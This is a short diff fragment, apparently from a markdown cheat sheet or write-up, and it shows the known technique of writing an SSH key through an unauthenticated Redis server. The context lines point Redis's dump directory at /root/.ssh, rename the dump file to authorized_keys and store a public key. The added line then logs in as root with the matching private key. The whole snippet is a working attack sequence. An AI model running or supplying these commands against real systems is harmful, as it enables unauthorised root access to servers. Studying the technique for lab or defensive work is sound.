@@ -21,4 +21,5 @@ redis-cli -h ip
 config set dir /root/.ssh
 config set dbfilename authorized_keys
 set 1 "ssh-rsa ..."
+ssh -i private_key root@target_ip
 ```
